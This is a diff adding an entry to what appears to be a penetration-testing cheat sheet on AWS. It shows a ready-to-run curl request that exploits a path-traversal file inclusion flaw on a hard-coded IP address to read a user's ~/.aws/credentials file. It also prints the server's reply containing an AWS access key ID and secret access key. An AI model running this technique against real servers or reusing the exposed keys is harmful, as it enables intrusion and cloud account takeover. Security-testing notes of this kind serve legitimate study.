@@ -1431,6 +1431,31 @@ Enumerating EC2 launch templates. One interesting parameter is the user data scr
 
 ---
 
+Use LFIs to steal AWS credentials from home folders. Check /etc/passwd for user enumeration first
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: 13.50.73.5' -H $'Upgrade-Insecure-Requests: 1' -H $'Priority: u=0, i' \
+    -b $'session=eyJpc0xvZ2dlZEluIjp0cnVlLCJuYW1lIjoidGVzdCJ9.aPPVxA.FEsyAfaxqimNvtJuHoJIXFSoNaQ' \
+    $'http://13.50.73.5/download?file=../../../../../home/nedf/.aws/credentials'       
+HTTP/1.1 200 OK
+Content-Disposition: inline; filename=credentials
+Content-Type: application/octet-stream
+Content-Length: 116
+Last-Modified: Wed, 14 Jun 2023 18:13:45 GMT
+Cache-Control: no-cache
+ETag: "1686766425.6516593-116-403247842"
+Date: Sat, 18 Oct 2025 18:07:31 GMT
+Vary: Cookie
+
+[default]
+aws_access_key_id = AKIATWVWNKAVEUUNAYO6
+aws_secret_access_key = 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
+```
+
+---
+
+
 
 
 <br>
